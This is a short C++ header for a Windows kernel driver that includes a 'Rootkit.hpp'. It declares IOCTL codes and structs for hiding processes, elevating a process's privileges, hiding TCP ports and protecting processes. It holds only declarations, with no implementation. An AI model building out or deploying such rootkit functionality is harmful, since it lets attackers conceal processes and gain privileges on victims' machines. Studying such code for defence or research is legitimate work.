#pragma once
#include <ntifs.h>
#include <ntddk.h>
#include "Rootkit.hpp"
#include "Debug.hpp"


#define IOCTL_HIDEPROC	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0001, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_ELEVATEME CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0002, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_HIDETCP	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0003, METHOD_NEITHER, FILE_SPECIAL_ACCESS) //Work in progress
#define IOCTL_PROTECT	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0004, METHOD_NEITHER, FILE_SPECIAL_ACCESS)

namespace Dispatch
{
	NTSTATUS DriverDispatch(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
	NTSTATUS DriverCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

	VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);

	struct HideProcData {
		ULONG TargetPID;
	};

	struct ElevateData {
		ULONG TargetPID;
	};

	struct HideTcpData {
		ULONG Port;
	};

	struct ProtectProcessData {
		ULONG TargetPID;
	};
}